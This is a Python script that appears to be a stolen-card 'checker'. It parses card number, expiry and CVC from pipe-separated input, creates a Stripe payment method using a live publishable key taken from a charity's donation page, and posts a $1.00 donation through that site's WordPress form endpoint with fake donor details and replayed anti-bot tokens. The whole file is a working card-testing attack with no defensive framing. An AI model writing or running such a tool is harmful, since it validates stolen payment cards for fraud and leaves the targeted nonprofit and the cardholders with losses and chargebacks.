import requests,re
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()

  headers = {
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
}

  data = {
    'type': 'card',
    'card[number]': n,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'guid': 'NA',
    'muid': 'NA',
    'sid': 'NA',
    'referrer': 'https://sedulofoundation.org',
    'key': 'pk_live_51NOIExCHAVuxnsKyEay5Gb7PWKNFbQflaC7QtocIaJVILR1TRPqVh6ljCuiioKMcHFSZb0JMe97UChICXUHC7tN500O2ieEPMd',
}

  r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
  pm = r1.json().get('id')
  cookies = {
    '__stripe_mid': 'c97d35bb-cc44-4369-9e6d-2e59b8c797ca3939e0',
    '__stripe_sid': '98c9a588-4986-4029-a656-1938c2bcdc533515f9',
}

  headers = {
    'accept': '*/*',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=c97d35bb-cc44-4369-9e6d-2e59b8c797ca3939e0; __stripe_sid=98c9a588-4986-4029-a656-1938c2bcdc533515f9',
    'origin': 'https://sedulofoundation.org',
    'priority': 'u=1, i',
    'referer': 'https://sedulofoundation.org/donate/',
    'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

  params = {
    't': '1733703132851',
}

  data = {
    f'data': '__fluent_form_embded_post_id=376&_fluentform_3_fluentformnonce=026a53ac61&_wp_http_referer=%2Fdonate%2F&custom-payment-amount=1.00&names%5Bfirst_name%5D=waznimey&names%5Blast_name%5D=zaw&email=waznimey%40gmail.com&numeric-field=959976246250&address_1%5Baddress_line_1%5D=street%2027&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=Newyork&address_1%5Bstate%5D=Newyork&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=GB&input_radio=no&payment_method=stripe&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiY3VzdG9tLXBheW1lbnQtYW1vdW50IG5hbWVzW2ZpcnN0X25hbWVdIG5hbWVzW2xhc3RfbmFtZV0gZW1haWwgbnVtZXJpYy1maWVsZCBhZGRyZXNzXzFbYWRkcmVzc19saW5lXzFdIGFkZHJlc3NfMVthZGRyZXNzX2xpbmVfMl0gYWRkcmVzc18xW2NpdHldIGFkZHJlc3NfMVtzdGF0ZV0gYWRkcmVzc18xW3ppcF0gYWRkcmVzc18xW2NvdW50cnldIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjExLCJpbnZpc2libGVfZmllbGRzIjoiX19mbHVlbnRfZm9ybV9lbWJkZWRfcG9zdF9pZCBfZmx1ZW50Zm9ybV8zX2ZsdWVudGZvcm1ub25jZSBfd3BfaHR0cF9yZWZlcmVyIHBheW1lbnRfbWV0aG9kIGN0X25vX2Nvb2tpZV9oaWRkZW5fZmllbGQiLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo1fX0%3D&ct_no_cookie_hidden_field=_ct_no_cookie_data_eyJjdF9tb3VzZV9tb3ZlZCI6dHJ1ZSwiY3RfaGFzX3Njcm9sbGVkIjp0cnVlLCJjdF9jaGVja2VkX2VtYWlscyI6IiU3QiUyMndhem5pbWV5JTQwZ21haWwuY29tJTIyJTNBJTdCJTIycmVzdWx0JTIyJTNBJTIyQ0FDSEVEJTIyJTJDJTIydGltZXN0YW1wJTIyJTNBMTczMzcwMzA3NSU3RCU3RCIsImN0X3BzX3RpbWVzdGFtcCI6IjE3MzM3MDMwNDMiLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IiU3QiUyMnZpc2libGVfZmllbGRzJTIyJTNBJTIyY3VzdG9tLXBheW1lbnQtYW1vdW50JTIwbmFtZXMlNUJmaXJzdF9uYW1lJTVEJTIwbmFtZXMlNUJsYXN0X25hbWUlNUQlMjBlbWFpbCUyMG51bWVyaWMtZmllbGQlMjBhZGRyZXNzXzElNUJhZGRyZXNzX2xpbmVfMSU1RCUyMGFkZHJlc3NfMSU1QmFkZHJlc3NfbGluZV8yJTVEJTIwYWRkcmVzc18xJTVCY2l0eSU1RCUyMGFkZHJlc3NfMSU1QnN0YXRlJTVEJTIwYWRkcmVzc18xJTVCemlwJTVEJTIwYWRkcmVzc18xJTVCY291bnRyeSU1RCUyMiUyQyUyMnZpc2libGVfZmllbGRzX2NvdW50JTIyJTNBMTElMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyX19mbHVlbnRfZm9ybV9lbWJkZWRfcG9zdF9pZCUyMF9mbHVlbnRmb3JtXzNfZmx1ZW50Zm9ybW5vbmNlJTIwX3dwX2h0dHBfcmVmZXJlciUyMHBheW1lbnRfbWV0aG9kJTIwYXBiY3RfdmlzaWJsZV9maWVsZHMlMjBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkJTIyJTJDJTIyaW52aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTYlN0QiLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9ma3BfdGltZXN0YW1wIjoiMTczMzcwMzA1NiIsImN0X3BvaW50ZXJfZGF0YSI6IiU1QiU1QjExMSUyQzU4JTJDMTUzOTclNUQlMkMlNUIzNjklMkM3OSUyQzE2NTkxJTVEJTJDJTVCNTgxJTJDNTMlMkMxOTE4NyU1RCUyQyU1QjYwOSUyQzUyJTJDMjM3NzklNUQlMkMlNUI2MTclMkM3MCUyQzI2NzQ1JTVEJTJDJTVCNjA0JTJDNDclMkMzMjQ4MiU1RCUyQyU1QjU2NiUyQzUxJTJDNDA1OTklNUQlMkMlNUI1NTQlMkM1NiUyQzQ2MTUwJTVEJTJDJTVCNjM3JTJDNDUlMkM1MDY2NSU1RCUyQyU1QjYxOSUyQzY4JTJDNTYzOTElNUQlMkMlNUI2MzklMkM2MiUyQzYxNzUyJTVEJTJDJTVCNDU2JTJDMzAlMkM2NDgzMiU1RCU1RCIsImN0X3NjcmVlbl9pbmZvIjoiJTdCJTIyZnVsbFdpZHRoJTIyJTNBMzkzJTJDJTIyZnVsbEhlaWdodCUyMiUzQTQ2NTUlMkMlMjJ2aXNpYmxlV2lkdGglMjIlM0EzOTMlMkMlMjJ2aXNpYmxlSGVpZ2h0JTIyJTNBNzIwJTdEIiwiYXBiY3RfaWZyYW1lc19wcm90ZWN0ZWQiOltdLCJjdF9jaGVja2pzIjoiNGRlNWQyNDEyMmRlNzYwZWUzMjgzMGFiMjYxZWNmMDkzZTk1NTRkNzBhZjM1YTY0MzZlZWVhNjY1NzBmMzJkMCIsImN0X3RpbWV6b25lIjoiNi41IiwiYXBiY3RfcGl4ZWxfdXJsIjoiaHR0cHMlM0ElMkYlMkZtb2RlcmF0ZTEwLXY0LmNsZWFudGFsay5vcmclMkZwaXhlbCUyRjU3YWIxYTAxOWZiMWM4NzQ0MzRmYWEzNDUxYjM1NTJhLmdpZiIsImFwYmN0X3Nlc3Npb25faWQiOiJ4eXJxIiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL3NlZHVsb2ZvdW5kYXRpb24ub3JnL2RvbmF0ZS8iLCJ0eXBvIjpbXX0%3D&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '3',
}

  r2 = requests.post(
    'https://sedulofoundation.org/wp-admin/admin-ajax.php',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
  return r2.json()
